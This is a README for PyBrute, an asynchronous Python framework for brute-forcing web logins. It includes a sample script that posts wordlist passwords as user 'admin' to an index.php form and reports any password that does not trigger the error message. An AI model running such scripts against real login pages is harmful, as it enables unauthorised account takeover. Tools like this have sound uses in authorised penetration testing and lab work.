# PyBrute

## Overview

PyBrute is a flexible and not so shitty bruteforce framework written in Python. It allows users to create custom bruteforce scripts and configure them for various tasks. This project is designed for asynchronous operations to maximize performance and efficiency.

## Features

- **Customizable Bruteforce Scripts:** Write your own bruteforce logic in Python.
- **Asynchronous Operations:** Utilizes `aiohttp` for non-blocking I/O operations.
- **Configurable Parameters:** Easily configure sessions, workers, and retries through `config.yaml`.

## Installation

1. Clone the repo:
    ```bash
    git clone https://github.com/CarixoHD/PyBrute.git
    ```
2. Navigate to the project directory:
    ```bash
    cd PyBrute
    ```
3. Install the required dependencies:
    ```bash
    pip install -r requirements.txt
    ```

## Usage

### Writing a Custom Bruteforce Script

Create your own function :

```python
from pybrute.runner import Runner
from pybrute.config import URL
import asyncio

result = []
async def main(session, password, results):
    password = password.strip()
    if not password:
        return None
    url = f"{URL}/index.php"
    form_data = {"name": "admin", "pwd": password}

    async with session.post(url, data=form_data, ssl=False) as response:
        resp = await response.text()
        if "Username or password is incorrect" not in resp:
            print(f"[+] Found password: {password}")
            # if you want to stop the script after finding one password, return True
            results.append(password)
            return True

    return None

run = Runner(main, result)
asyncio.run(run.run())

print(result)

```
**Note:** If you want the bruteforce to stop after one match, return `True`. If you want to find all the matches, return `None`.

### Configuring the Bruteforcer

Adjust the settings in `config.yaml`. This is also where you specify the wordlist you want to use, the url, the session and worker parameters, as well as headers, cookies, and payloads being used in the initial session setup.



README written by ChatGPT <3

